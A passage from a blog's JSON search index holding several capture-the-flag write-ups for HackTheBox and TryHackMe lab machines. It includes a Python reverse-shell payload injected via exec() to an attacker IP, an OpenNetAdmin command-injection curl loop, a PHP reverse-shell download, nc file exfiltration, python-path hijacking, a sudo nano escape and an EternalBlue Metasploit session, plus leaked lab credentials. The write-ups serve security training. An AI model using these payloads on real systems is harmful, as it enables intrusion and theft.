$conn-\u0026gt;connect_error); 12} 1314$sql= \u0026#34;SELECT * FROM items\u0026#34;; 15$result= $conn-\u0026gt;query($sql); 1617if ($result-\u0026gt;num_rows\u0026gt; 0) { 18// output data of each row 19while($row= $result-\u0026gt;fetch_assoc()) { 20echo \u0026#34;\u0026lt;article class=\u0026#39;thumb\u0026#39;\u0026gt;\u0026#34;; 21echo \u0026#34;\u0026lt;a href=\u0026#39;\u0026#34;.$row[\u0026#34;image_path\u0026#34;].\u0026#34;\u0026#39; class=\u0026#39;image\u0026#39;\u0026gt;\u0026lt;/img src=\u0026#39;\u0026#34;.$row[\u0026#34;thumb_path\u0026#34;].\u0026#34;\u0026#39; alt=\u0026#39;\u0026#39; /\u0026gt;\u0026lt;/a\u0026gt;\u0026#34;; 22echo \u0026#34;\u0026lt;h2\u0026gt;\u0026#34;.$row[\u0026#34;title\u0026#34;].\u0026#34;\u0026lt;/h2\u0026gt;\u0026#34;; 23echo \u0026#34;\u0026lt;p\u0026gt;\u0026#34;.$row[\u0026#34;text\u0026#34;].\u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; 24echo \u0026#34;\u0026lt;/article\u0026gt;\u0026#34;; 25} 26} 27else { 28echo \u0026#34;0 results\u0026#34;; 29} 30$conn-\u0026gt;close(); 31?\u0026gt; Privilege escalation : User  Database management tool: Adminer  Resembling the box name, adminer is a database management tool like phpmyadmin that lets manage the database through a browser. The default login page URI of adminer is adminer.php. We find login page in the /utility-scripts directory. The name of the database id admirerdb found from the file dump.sql\nWe try logging in with the different creds we found previously but none works.\nWe search for adminer vulnerabilities and find one at (https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool)\nAdminer Exploit  We follow the instructions:\n We connect to mysql server running on our local machine from the adminer page. For this, we set up a user and a database for connection from remote sources. We follow the steps as follows:   Create a new database and add a new user with password and grant privileges to the created database. NExt we add a new table \u0026lsquo;test\u0026rsquo; to the database  1CREATE DATABASE \u0026#39;htb_admirer\u0026#39;; 2CREATE USER admirer@10.10.14.2 IDENTIFIED BY \u0026#39;admirer\u0026#39;; 3GRANT ALL PRIVILEGES ON htb_admirer.* TO admirer@10.10.14.2 WITH GRANT OPTION; 4CREATE USER admirer@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;admirer\u0026#39;; 5GRANT ALL PRIVILEGES ON htb_admirer.* TO admirer@\u0026#39;%\u0026#39; WITH GRANT OPTION; 6FLUSH PRIVILEGES; 7use htb_admirer; 8CREATE TABLE test( 9 \u0026gt; name VARCHAR(255), 10 \u0026gt; color CHAR(7), 11 \u0026gt; PRIMARY KEY (name) 12);  Change the bind address in your file /etc/mysql/mariadb.conf.d/50-server.cnf from default 127.0.0.1 to 0.0.0.0 for allowing remote connections to mysql server. Note that this is not secure and should be changed after the work is done.   We connect to our mysql server with the necessary creds from adminer:\n  Going into the sql command, we put in our required command and execute. Since the adminer.php file in in the utility-scripts directory, we can use ../index.php to read the local index.php file which should contain the db creds for user waldo, which we ound in the backup but with a typo:\n  1LOAD DATA LOCAL INFILE \u0026#39;var/lib/mysql/mysql/local.xml\u0026#39; 2INTO TABLE htb_admirer.test 3FIELDS TERMINATED BY \u0026#34;\\n\u0026#34; We read the data inserted to our table from the local file index.php.  We get the correct creds for user waldo now. $password = \u0026ldquo;\u0026amp;\u0026lt;h5b~yK3F#{PaPB\u0026amp;dA}{H\u0026gt;\u0026rdquo;;\nNow, we use the found creds to login into adminer as waldo\nWe see that we can see the images.\nSince many users use the same password in many places, we try the password for waldo to get ssh access and we succeed\nPrivilege escalation : root  Enumeration  Running sudo -l with waldo\u0026rsquo;s password shows that we can run /opt/scripts/admin_scripts.sh as root.\nRunning the script, we can backup the /etc/shadow file but it is only readable by root. We try to hijack the path \u0026ldquo;echo\u0026rdquo; is called from in the script by changing the path to our directory /tmp/fm and creating a py file named \u0026ldquo;echo\u0026rdquo; there. But it fails since we see that in sudo -l command output, there is a secure path, which sets the path for sudo commands. So, path hijacking will not work.\nAfter lookin around for a while, we find that we can hijack the python path for the module shutil which is imported in the file backup.py, which is run in the script admin_tasks.sh in the task 6-backup web. This looks like a promising attack vector.\nPython path hijack  You can read up on this here\nWe create a directory /tmp/fm and write a python script in the name of the module shutil.py containing the function make_archive(a,b,c) which will run out desired code, in this case cat ing out the root.txt to a file named hello in the directory /tmp/fm:\n1import os 2 3def make_archive(a,b,c): 4 os.system(\u0026#34;cat /root/root.txt \u0026gt; /tmp/fm/hello\u0026#34;) Now we have to make python look for the module in our directory first instead of /usr/lib/python3.5.\nWe trying exporting the path using export PYTHONPATH=/tmp/fm. But this path is not read while running sudo. You can read up on PYTHONPATH here\nAfter looking for a bit, we find that we can pass environment variables directly in the sudo command like sudo VARIABLE=VALUE COMMAND.\nThis was completely new to me. I found this here.\nSo, we run the following commands to get our root.txt\n","id":8,"section":"writeups","summary":"Initial Foothold  Nmap  Open ports: 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0) 80/tcp open tcpwrapped\nFound robots.txt that disallows /admin-dir\nFound a possible user named waldo\nDirectory Busting  Fuzzing for .txt files in the /admin-dir, found 2 files:\n contacts.txt credentials.txt  1ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.187/admin-dir/FUZZ.txt We find the following in the credentials.txt file.\n[Internal mail account] w.cooper@admirer.htb fgJr6q#S\\W:$P [FTP account] ftpuser %n?","tags":["fuzzing","linux","python path hijack","mysql","adminer","sudo"],"title":"Hackthebox - Admirer Writeup","uri":"https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-admirer-writeup/","year":"2020"},{"content":"Em Dee Five for Life  We start the instance\nThe page gives us a string and asks for the md5sum as the input, after we inpput the md5sum of the string got from our terminal, we get a response of too slow.\nSo to make the response fast, we can write a simple python script. First, we intercept the post request to the page in burpsuite to chech how the md5 hash is passed and find that it is passed as raw data.\nNow, we write our script.\n1#! /usr/bin/env python 2 3from __future__ import print_function 4import requests 5import re 6import hashlib 7import os 8 9# We setup our proxy here to pass our requests through burpsuite for checking 10#--------------------------------------------------------------------------------- 11proxy = \u0026#39;127.0.0.1:8080\u0026#39; 12 13# os.environ[\u0026#39;http_proxy\u0026#39;] = proxy 14# os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy 15# os.environ[\u0026#39;https_proxy\u0026#39;] = proxy 16# os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy 17 18 19# Here, we make the get request to get our initial page requesting for the md5 20by creating a session, as we need to post our response to the same session 21#--------------------------------------------------------------------------------- 22url = \u0026#34;http://docker.hackthebox.eu:31405\u0026#34; 23 24req = requests.Session() 25page = req.get(url) 26text = page.content 27print(text) 28 29 30# We use python regex to find seperate our hash out of the html file, we can 31find the regex by analyzing the whole html file first. 32#--------------------------------------------------------------------------------- 33x = re.findall(\u0026#34;\u0026lt;h3 align=\u0026#39;center\u0026#39;\u0026gt;(.*)\u0026lt;/h3\u0026gt;\u0026#34;, text)[0] 34x = x.rstrip() 35 36# print(\u0026#34;hash: \u0026#34; + x) 37# print(s) 38 39 40# We find the md5sum of the supplied string and pass it as data to a post 41request made to the session 42#--------------------------------------------------------------------------------- 43emd5 = hashlib.md5(x).hexdigest() 44 45# print(\u0026#34;md5sum: \u0026#34; + emd5) 46 47payload = dict(hash=emd5) 48 49response = req.post(url, data = payload) 50 51# And here we get the response back and get the flag out 52#--------------------------------------------------------------------------------- 53# print(response.text) 54 55flag = re.findall(\u0026#34;\u0026lt;p align=\u0026#39;center\u0026#39;\u0026gt;(.*)\u0026lt;/p\u0026gt;\u0026#34;, response.content)[0] 56print(\u0026#34;flag: \u0026#34; + flag) And we get our flag.\n","id":9,"section":"writeups","summary":"Em Dee Five for Life  We start the instance\nThe page gives us a string and asks for the md5sum as the input, after we inpput the md5sum of the string got from our terminal, we get a response of too slow.\nSo to make the response fast, we can write a simple python script. First, we intercept the post request to the page in burpsuite to chech how the md5 hash is passed and find that it is passed as raw data.","tags":["python","web"],"title":"Hackthebox[Web-Challenge] Writeups","uri":"https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-web-challenge-writeups/","year":"2020"},{"content":"Initial Foothold  Nmap scan:  # nmap -sC -sV -sS -oA nmap.out 10.10.10.168 Intersting open ports:\n 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp closed http 8080/tcp open http-proxy BadHTTPServer 9000 unknown(nc does not show any banner)  Website at port 8080:   Looks like the server runs custom software for security   We have some contact information. We see that the box domain is obscure.htb   Source code for the web server is in \u0026lsquo;SuperSecureServer.py\u0026rsquo; in the secret development directory  Fuzzing the site to find the server source code using wfuzz:  wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt --hc 401,402,403,404 http://10.10.10.168:8080/FUZZ/SuperSecureServer.py Output:\nWe find the file under a directory called \u0026ldquo;develop\u0026rdquo;\nAnalyze the custom server source file:  We get the file using wget:\nwget http://10.10.10.168:8080/develop/SuperSecureServer.py In the source, we find an interesting function servedoc:\nWhat intersets us are the following:\npath = urllib.parse.unquote(path) info = \u0026quot;output = 'Document: {}'\u0026quot; exec(info.format(path)) We insert the following payload in the path of our request to the server to get a reverse shell:\n/';import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;10.10.15.184\u0026quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026quot;/bin/sh\u0026quot;,\u0026quot;-i\u0026quot;]);' So our web url with payload stands as: http://10.10.10.168:8080/';import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026ldquo;10.10.15.184\u0026rdquo;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026quot;/bin/sh\u0026rdquo;,\u0026quot;-i\u0026rdquo;]);\u0026rsquo;\nWe can write a python script that performs the request for us:\n1import requests 2import os 3 4 5host = \u0026#34;http://10.10.10.168:8080/\u0026#34; 6 7payload = \u0026#34;%27%0Aimport%20socket%2Csubprocess%2Cos%0As%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%0As.connect%28%28%2210.10.14.234%22%2C1234%29%29%0Aos.dup2%28s.fileno%28%29%2C0%29%0Aos.dup2%28s.fileno%28%29%2C1%29%0Aos.dup2%28s.fileno%28%29%2C2%29%0Ap%3Dsubprocess.call%28%5B%22/bin/bash%22%2C%22-i%22%5D%29%0A%27\u0026#34; 8 9requests.get(host+payload) We open a nc listener on port 1337 on our kali and enter the request to get a reverse shell\nWe upgrade our shell to a fully interactive one:\nPrivilege escalation - User:  We find a user named robert in the home directory and find the following files:\nThe following files interests us:\n check.txt out.txt passwordreminder.txt SuperSecureCrypt.py BetterSSH  We transfer the files to our local machine using nc: On target: nc 10.10.15.184 8888 \u0026lt; SuperSecureCrypt.py On host: nc -lnvp 8888 \u0026gt; SuperSecureCrypt.py\nSo, we have a custom Crypt here. The contents of the files are:\nSo, we have to find out the key of the user robert by briyteforcing and then use the key to decrypt the passwordreminder.txt using the script SuperSecureCrypt.py\nWe write a decryptor in python\n1#! /usr/bin/env python3 2# -*- coding: utf-8 -*- 3 4from __future__ import print_function 5 6 7def decrypt(text, key): 8 keylen = len(key) 9 keyPos = 0 10 decrypted = \u0026#34;\u0026#34; 11 for x in text: 12 keyChr = key[keyPos] 13 newChr = ord(x) 14 newChr = chr((newChr - ord(keyChr)) % 255) 15 decrypted += newChr 16 keyPos += 1 17 keyPos = keyPos % keylen 18 return decrypted 19 20key = \u0026#39;\u0026#39; 21pos = 0 22with open(\u0026#34;out.txt\u0026#34;, \u0026#39;r\u0026#39;, encoding=\u0026#39;UTF-8\u0026#39;) as f: 23 data = f.read() 24 25 with open(\u0026#34;check.txt\u0026#34;, \u0026#39;r\u0026#39;, encoding=\u0026#39;UTF-8\u0026#39;) as d: 26 ch = d.read() 27 for x in data: 28 for j in range(255): 29 # print(pos, end=\u0026#39;\u0026#39;) 30 # print(ch[pos], end=\u0026#39;\u0026#39;) 31 print(key + \u0026#39;\\n\u0026#39;) 32 newChr = ord(x) 33 newChr = chr((newChr - j) % 255) 34 if ch[pos] == newChr: 35 key += chr(j) 36 pos = pos + 1 37 break 38 39print(key) Running the script, we find the key: alexandrovich\nNow we decrypt the passwordremider.txt:\nWe found our password for the user. We can use these creds to login using ssh as the user robert and read out user.txt file\nPrivilege escalation - Root:  Running command sudo -l, we find following:\nSo, we can run the command /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py as root\nWe have a look at the script BetterSSH.py\nWe see here that during the login process using the script, it temporarily writes the shadow file into the tmp/SSH file. So we can read the shadow file from the tmp/SSH folder while the ssh login is running. The file is written after taking the password input. But as we run the script, we see that as soon as we enter the password, we get an invalind user error. So, we have a race condition here. What we do is run a while loop in the background that continuosly copies all files in the /tmp/SSH folder into a folder of our own e.g. /tmp/fm. Then if we run our ssh script, the shadow file will get copied into the /tmp/SSH folder and so to our own created dir.\nWe see a new file in our created directory. We check the contents of the file and get the password hashes.\nWe see that the hash is an crypt hash.We check the type of the hash using hashcat. SInce it has got $6, this should be sha512crypt.\nSo now we decrypt the hash with:\nhashcat -m 1800 -o root_pass root_hash /usr/share/wordlists/rockyou.txt And after waiting some time, we get our required root pass in the root_pass file:\nWe use the password to login as root using su and get our root.txt file\n","id":10,"section":"writeups","summary":"Initial Foothold  Nmap scan:  # nmap -sC -sV -sS -oA nmap.out 10.10.10.168 Intersting open ports:\n 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp closed http 8080/tcp open http-proxy BadHTTPServer 9000 unknown(nc does not show any banner)  Website at port 8080:   Looks like the server runs custom software for security   We have some contact information. We see that the box domain is obscure.","tags":["python","fuzzing","john"],"title":"Hackthebox - Obscurity Writeup","uri":"https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-obscurity-writeup/","year":"2020"},{"content":"Initial Foothold - Getting www-data shell using exploit  Nmap scan  Interesting ports:\n 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works  We have a look at the webpage and we find a default apache webpage.\nDirectory searching with Gobuster:  We now search for any web directories using gobuster\nWe find two folders:\n /music /artwork  Going into the /music directory, we find a webpage with login option\n Foothold Going into the login, we get an OpenNetAdmin login page at the address http://10.10.10.171/ona/\n Exploit  Searching for exploits for OpenNetAdmin, we find a remote code execution vulnerability on exploit-db. (https://www.exploit-db.com/exploits/47691) We download the exploit and change it according to our needs.\n1#! /bin/bash 2 3URL=\u0026#34;${1}\u0026#34; 4while true;do 5 echo -n \u0026#34;$\u0026#34;; read cmd 6 curl --silent -d 7\u0026#34;xajax=window_submit\u0026amp;xajaxr=1574117726710\u0026amp;xajaxargs[]=tooltips\u0026amp;xajaxargs[]=ip%3D%3E;echo 8\\\u0026#34;BEGIN\\\u0026#34;;${cmd};echo \\\u0026#34;END\\\u0026#34;\u0026amp;xajaxargs[]=ping\u0026#34; \u0026#34;${URL}\u0026#34; | sed -n -e 9\u0026#39;/BEGIN/,/END/ p\u0026#39; | tail -n +2 | head -n -1 10done We run the exploit to get a web shell\nWe try getting a reverse shell to get a more interactive shell.\nWe get the php reverse shell from pentest monkey and upload it to the box using wget using the remote command execution vulnerability\nOn host:\n# wget https://github.com/pentestmonkey/php-reverse-shell/raw/master/php-reverse-shell.php # python3 -m http.server # nc -lnvp 1234 On target:\n$ wget http://10.10.15.175:8000/php-reverse-shell.php Then we get our reverse shell going to the url http:/10.10.10.171/ona/php-reverse-shell.php\nAnd we get our reverse shell\n Privilege Escalation - User:  From the reverse shell, we see that the banner prints out some info about the machine. We find:\n Running Ubuntu Two users:  joanna jimmy     Enumeration  We look around the /opt/www/ona directory and find a database config file which gives us a password.\nWe find the password n1nj4W4rri0R!\nWe try it with both the users and find that it is the password for jimmy. We use the creds to ssh into the box as jimmy.\nBut it does not have the user.txt file. So this is not our required user.\n Escalation to user joanna:  Enumeration (port 52846)  We run linpeas.sh on the target and found 2 open ports\n 52846 3306  connecting to the port 52846 using curl, we get an html response. Now, we look into the var/www directory and find the directory internal, that contains an intersting file main.php\n So we see that it prints out the id_rsa of the user joanna.\nWe curl the url 127.0.0.1:52846/main.php and get the id_rsa of the user joanna\nWe copy the file to our local machine and crack it with john\n id_rsa crack with john  Trying to login with the private key, we find that it requires a passphrase\nSo, we crack the pass phrase using john\nWe use the cracked passphrase to ssh into user joanna and get the user.txt\n Privilege Escalation - Root:  Enumeration  We find that our user joanna is allowed to run the following command as sudo\n Escalation  We run the command and get a nano editor running as root. We can spawn a root shell from the nano, following the commands found in GTFObins\nCommnads:\nnano ^R^X reset; sh 1\u0026gt;\u0026amp;0 2\u0026gt;\u0026amp;0 ","id":11,"section":"writeups","summary":"Initial Foothold - Getting www-data shell using exploit  Nmap scan  Interesting ports:\n 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works  We have a look at the webpage and we find a default apache webpage.\nDirectory searching with Gobuster:  We now search for any web directories using gobuster","tags":["php","gtfobins"],"title":"Hackthebox - OpenAdmin Writeup","uri":"https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-openadmin-writeup/","year":"2020"},{"content":"Task 1:  We use the usual nmap to scan the machine. Note that it says that the machine does not respond to ICMP requests. So, we have to use -Pn with nmap for scanning  nmap -sC -sV -Pn -oN nmap-out 10.10.221.176 The results:\n# Nmap 7.80 scan initiated Wed Mar 25 10:26:26 2020 as: nmap -sC -sV -Pn -oN nmap.out 10.10.221.176 Nmap scan report for 10.10.221.176 Host is up (0.23s latency). Not shown: 991 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 3389/tcp open ssl/ms-wbt-server? |_ssl-date: 2020-03-25T14:29:02+00:00; +1s from scanner time. 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49158/tcp open msrpc Microsoft Windows RPC 49159/tcp open msrpc Microsoft Windows RPC Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 1h15m01s, deviation: 2h30m00s, median: 0s |_nbstat: NetBIOS name: JON-PC, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 02:d2:17:3d:b2:64 (unknown) | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: Jon-PC | NetBIOS computer name: JON-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2020-03-25T09:28:55-05:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-03-25T14:28:55 |_ start_date: 2020-03-25T14:11:35 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Mar 25 10:30:01 2020 -- 1 IP address (1 host up) scanned in 215.17 seconds We find 3 ports with port number under 1000:   135 139 445  We see that the machine is running Windows \u0026amp; SP 1. We look for exploits for this OS on google, and one that mostly comes up is the vulnerability ms17-010.  Task 2: Gain access  We start metasploit  msfconsole [-] ***rting the Metasploit Framework console...\\ [-] * WARNING: No database support: No database YAML file [-] *** MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMM MMMN$ vMMMM MMMNl MMMMM MMMMM JMMMM MMMNl MMMMMMMN NMMMMMMM JMMMM MMMNl MMMMMMMMMNmmmNMMMMMMMMM JMMMM MMMNI MMMMMMMMMMMMMMMMMMMMMMM jMMMM MMMNI MMMMMMMMMMMMMMMMMMMMMMM jMMMM MMMNI MMMMM MMMMMMM MMMMM jMMMM MMMNI MMMMM MMMMMMM MMMMM jMMMM MMMNI MMMNM MMMMMMM MMMMM jMMMM MMMNI WMMMM MMMMMMM MMMM# JMMMM MMMMR ?MMNM MMMMM .dMMMM MMMMNm `?MMM MMMM` dMMMMM MMMMMMN ?MM MM? NMMMMMN MMMMMMMMNe JMMMMMNMMM MMMMMMMMMMNm, eMMMMMNMMNMM MMMMNNMNMMMMMNx MMMMMMNMMNMMNM MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM https://metasploit.com =[ metasploit v5.0.60-dev ] + -- --=[ 1947 exploits - 1089 auxiliary - 333 post ] + -- --=[ 556 payloads - 45 encoders - 10 nops ] + -- --=[ 7 evasion ] We search for exploits for the vulnerability ms17-010:  msf5 \u0026gt; search ms17-010 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB RemoteWindows Command Execution 1 auxiliary/scanner/smb/smb_ms17_010 normal Yes MS17-010 SMB RCE Detection 2 exploit/windows/smb/doublepulsar_rce 2017-04-14 great Yes DOUBLEPULSAR Payload Execution and Neutralization 3 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 4 exploit/windows/smb/ms17_010_eternalblue_win8 2017-03-14 average No MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+ 5 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution Here, we will use the exploit exploit/windows/smb/ms17_010_eternalblue.\nmsf5 \u0026gt; use exploit/windows/smb/ms17_010_eternalblue msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; Info: Description: This module is a port of the Equation Group ETERNALBLUE exploit, part of the FuzzBunch toolkit released by Shadow Brokers. There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later completed in srvnet!SrvNetWskReceiveComplete. This exploit, like the original may not trigger 100% of the time, and should be run continuously until triggered. It seems like the pool will get hot streaks and need a cool down period before the shells rain in again. The module will attempt to use Anonymous login, by default, to authenticate to perform the exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it will use those instead. On some systems, this module may cause system instability and crashes, such as a BSOD or a reboot. This may be more likely with some payloads.\nReferences:\n https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010 https://cvedetails.com/cve/CVE-2017-0143/ https://cvedetails.com/cve/CVE-2017-0144/ https://cvedetails.com/cve/CVE-2017-0145/ https://cvedetails.com/cve/CVE-2017-0146/ https://cvedetails.com/cve/CVE-2017-0147/ https://cvedetails.com/cve/CVE-2017-0148/ https://github.com/RiskSense-Ops/MS17-010  We check the options for this exploit:  msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; options Module options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u0026lt;path\u0026gt;' RPORT 445 yes The target port (TCP) SMBDomain . no (Optional) The Windows domain to use for authentication SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Target. VERIFY_TARGET true yes Check if remote OS matches exploit Target. Exploit target: Id Name -- ---- 0 Windows 7 and Server 2008 R2 (x64) All Service Packs We see that we have to set out RHOSTS whick will be our target machine.So, we set RHOST with the ip address of the windows machine from the site:\nmsf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set RHOSTS 10.10.221.176 RHOSTS =\u0026gt; 10.10.221.176 We run the exploit.  msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; run [*] Started reverse TCP handler on 10.8.30.133:4444 [+] 10.10.247.170:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 10.10.247.170:445 - Connecting to target for exploitation. [+] 10.10.247.170:445 - Connection established for exploitation. [+] 10.10.247.170:445 - Target OS selected valid for OS indicated by SMB reply [*] 10.10.247.170:445 - CORE raw buffer dump (42 bytes) [*] 10.10.247.170:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes [*] 10.10.247.170:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv [*] 10.10.247.170:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1 [+] 10.10.247.170:445 - Target arch selected valid for arch indicated by DCE/RPC reply [*] 10.10.247.170:445 - Trying exploit with 12 Groom Allocations. [*] 10.10.247.170:445 - Sending all but last fragment of exploit packet [*] 10.10.247.170:445 - Starting non-paged pool grooming [+] 10.10.247.170:445 - Sending SMBv2 buffers [+] 10.10.247.170:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [*] 10.10.247.170:445 - Sending final SMBv2 buffers. [*] 10.10.247.170:445 - Sending last fragment of exploit packet! [*] 10.10.247.170:445 - Receiving response from exploit packet [+] 10.10.247.170:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! [*] 10.10.247.170:445 - Sending egg to corrupted connection. [*] 10.10.247.170:445 - Triggering free of corrupted buffer. [*] Command shell session 1 opened (10.8.30.133:4444 -\u0026gt; 10.10.247.170:49184) at 2020-03-25 15:17:21 -0400 [+] 10.10.247.170:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.247.170:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.247.170:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt; Voila! we got a shell!\nWe background the shell using Ctrl+z  Task 3: Escalate  In order to convert the shell to a meterpreter shell, we use the following exploit:  msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; use post/multi/manage/shell_to_meterpreter msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; We check the options for this exploit:  msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; options Module options (post/multi/manage/shell_to_meterpreter): Name Current Setting Required Description ---- --------------- -------- ----------- HANDLER true yes Start an exploit/multi/handler to receive the connection LHOST no IP of host that will receive the connection from the payload (Will try to auto detect). LPORT 4433 yes Port for payload to connect to. SESSION yes The session to run this module on. So the option that we are required to change is SESSION\nIn order to ser the option session we need the session id of our previously opened shell. To find the session id, we enter the command sessions -l  msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; sessions -l Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 shell x64/windows Microsoft Windows [Version 6.1.7601] 10.8.30.133:4444 -\u0026gt; 10.10.247.170:49184 (10.10.247.170) So, the session id is 1. We set the session\nmsf5 post(multi/manage/shell_to_meterpreter) \u0026gt; set SESSION 1 SESSION =\u0026gt; 1 We run the exploit.  msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; run [*] Upgrading session ID: 1 [*] Starting exploit/multi/handler [*] Started reverse TCP handler on 10.8.30.133:4433 [*] Post module execution completed msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; [*] Sending stage (180291 bytes) to 10.10.247.170 [*] Meterpreter session 2 opened (10.8.30.133:4433 -\u0026gt; 10.10.247.170:49193) at 2020-03-25 15:24:05 -0400 [*] Stopping exploit/multi/handler msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 shell x64/windows Microsoft Windows [Version 6.1.7601] 10.8.30.133:4444 -\u0026gt; 10.10.247.170:49184 (10.10.247.170) 2 meterpreter x86/windows NT AUTHORITY\\SYSTEM @ JON-PC 10.8.30.133:4433 -\u0026gt; 10.10.247.170:49193 (10.10.247.170) We see that we got a meterpreter shell!\nWe can interact with th meterpreter shell using the following command:  msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; sessions -i 2 [*] Starting interaction with 2... meterpreter \u0026gt; We run getsystem, shell and whoami to check if we have escalated to NT AUTHORITY\\SYSTEM  meterpreter \u0026gt; getsystem ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)). meterpreter \u0026gt; shell Process 2216 created. Channel 1 created. Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;whoami whoami nt authority\\system C:\\Windows\\system32\u0026gt; So, we are in fact system!\nWe enter the command ps to view the running processes  C:\\Windows\\system32\u0026gt;^Z Background channel 1? [y/N] y meterpreter \u0026gt; ps Process List ============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 